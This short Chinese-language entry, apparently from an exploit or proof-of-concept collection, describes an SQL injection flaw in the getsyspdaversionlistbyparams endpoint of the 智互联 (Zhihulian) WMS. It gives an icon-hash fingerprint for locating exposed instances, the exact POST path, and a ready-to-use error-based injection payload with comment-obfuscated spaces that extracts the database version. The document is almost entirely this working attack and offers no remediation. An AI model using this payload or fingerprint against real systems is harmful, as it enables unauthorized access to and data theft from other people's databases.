# 智互联WMSgetsyspdaversionlistbyparams存在SQL注入漏洞

智互联 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="155833598"`
- **请求**：`POST /dapilc/restful/service/ilcwmsplus/ISysPdaVersionService/getsyspdaversionlistbyparams HTTP/1.1`

**Payload**
```
"condition": {
"field": "createDate,(select/**/5422/**/from(select/**/count(*),concat(0x7e,version(),0x7e,floor(rand(0)*2))x/**/from/**/information_schema.plugins/**/group/**/by/**/x)a)",
"order": "asc"
},
"current": 1,
"size": 1
```
- **响应特征**：200